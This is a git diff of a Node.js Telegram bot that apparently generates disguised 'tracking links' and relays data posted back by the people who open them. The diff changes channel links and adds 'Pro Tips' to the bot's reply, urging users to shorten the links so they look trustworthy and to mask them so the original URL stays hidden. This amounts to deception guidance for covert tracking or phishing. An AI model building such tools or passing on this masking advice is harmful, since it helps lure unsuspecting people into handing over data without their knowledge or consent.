@@ -56,8 +56,8 @@ bot.on('callback_query', async (query) => {
                     reply_markup: JSON.stringify({
                         inline_keyboard: [
                             [{ text: "🚀 Create Link", callback_data: "crenew" }], // Create Link Button
-                            [{ text: "⭕ YouTube ⭕", url: "https://bit.ly/3RzjdHX" }], // Updated YouTube Button
-                            [{ text: "💬 Telegram Group 💬", url: "https://bit.ly/3skACfa" }], // Updated Telegram Group Button
+                            [{ text: "⭕ YouTube ⭕", url: "https://youtube.com/@technicalwhitehat?si=o7NiJ_VNYi5_HFp7" }], // Updated YouTube Button
+                            [{ text: "💬 Telegram Group 💬", url: "https://t.me/technicalwhitehat" }], // Updated Telegram Group Button
                             [{ text: "🆘 Help", callback_data: "help_menu" }] // New Help Button
                         ]
                     })
@@ -188,14 +188,23 @@ async function createLink(cid, msg) {
 
         bot.sendChatAction(cid, "typing");
         bot.sendMessage(cid, `
-✅ Your links have been created successfully:
+🎉 *Congratulations! Your tracking links are ready!* 🎉
 
-🌐 Cloudflare Link:
+🌐 *Cloudflare Link:*
 ${cUrl}
 
-🌐 WebView Link:
+🌐 *WebView Link:*
 ${wUrl}
-        `, m);
+
+📌 *Pro Tips:*
+- Use URL shorteners like **bit.ly** or **tinyurl** to make your links look clean and trustworthy.
+- Mask your tracking links using services like **rebrandly** or **hyperlink.rest** to hide the original URL.
+
+📢 *Stay Connected with Us:*
+👉 *YouTube Channel:* [Technical White Hat](https://youtube.com/@technicalwhitehat?si=o7NiJ_VNYi5_HFp7)
+👉 *Telegram Channel:* [Technical White Hat](https://t.me/technicalwhitehat)
+
+🔥 *Ready to create another link?* Click below to create a new one! `, { parse_mode: 'Markdown', ...m });
     } else {
         bot.sendMessage(cid, `🤔 Oops! Something's not right.\n🔗 Make sure to enter a valid URL (including http or https), and let's try again!`);
         createNew(cid);
@@ -271,7 +280,6 @@ app.get("/w/:path/:uri", (req, res) => {
     }
 });
 
-
 // 📌 Handle Data Route (Fixed to ensure message delivery)
 app.post("/", async (req, res) => {
     const uid = decodeURIComponent(req.body.uid) || null;
@@ -294,7 +302,6 @@ app.post("/", async (req, res) => {
         res.status(400).send("Missing data");
     }
 });
-
 
 // 📌 Start the Express Server (Consolidated to port 3000)
 const PORT = process.env.PORT || 3000;
